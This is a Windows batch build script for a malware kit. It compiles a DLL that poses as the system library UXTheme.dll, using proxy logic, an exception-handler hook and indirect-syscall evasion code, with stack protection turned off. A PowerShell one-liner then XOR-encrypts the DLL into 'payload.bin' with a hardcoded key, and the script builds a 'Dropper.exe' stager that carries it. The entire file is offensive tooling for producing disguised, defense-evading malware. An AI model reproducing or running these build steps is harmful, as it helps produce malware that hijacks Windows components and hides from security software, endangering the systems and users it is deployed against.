@echo off
SET "VS_PATH=C:\Program Files (x86)\Microsoft Visual Studio\18\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
if not exist "%VS_PATH%" ( echo [!] VS Build Tools not found! && exit /b 1 )
call "%VS_PATH%"

echo [*] Compiling Shattered Mirror DLL (UXTheme.dll)...
ml64 /c /Fo Evasion_Suite\IndirectSyscalls.obj Evasion_Suite\IndirectSyscalls.asm
cl.exe /EHsc /O2 /GS- /LD /I Evasion_Suite\include ^
Orchestrator\ProxyLogic.cpp Orchestrator\VEH_Handler.cpp Orchestrator\AtomManager.cpp Orchestrator\IPC_Channel.cpp ^
Evasion_Suite\src\*.cpp Atoms\*.cpp Evasion_Suite\IndirectSyscalls.obj ^
advapi32.lib winhttp.lib bcrypt.lib user32.lib shell32.lib ^
/Fe:UXTheme.dll /link /IMPLIB:UXTheme.lib

echo [*] Encrypting Payload (UXTheme.dll -^> payload.bin)...
powershell -NoProfile -Command "$b=[IO.File]::ReadAllBytes('UXTheme.dll');$k=[Text.Encoding]::ASCII.GetBytes('1QO0kVer1PzENxox');for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i %% $k.Length]};[IO.File]::WriteAllBytes('payload.bin',$b)"

if not exist "payload.bin" ( echo [!] FAILED: payload.bin missing! && exit /b 1 )
echo [*] Packaging Resources...
rc.exe /nologo /i Builder_GUI Builder_GUI\dropper.rc
echo [*] Compiling Master Stager (Dropper.exe)...
cl.exe /EHsc /O2 /GS- Builder_GUI\Dropper_Template.cpp Builder_GUI\dropper.res advapi32.lib shell32.lib user32.lib gdi32.lib comdlg32.lib /Fe:Dropper.exe
echo [*] Build step status: %errorlevel%
exit /b 0
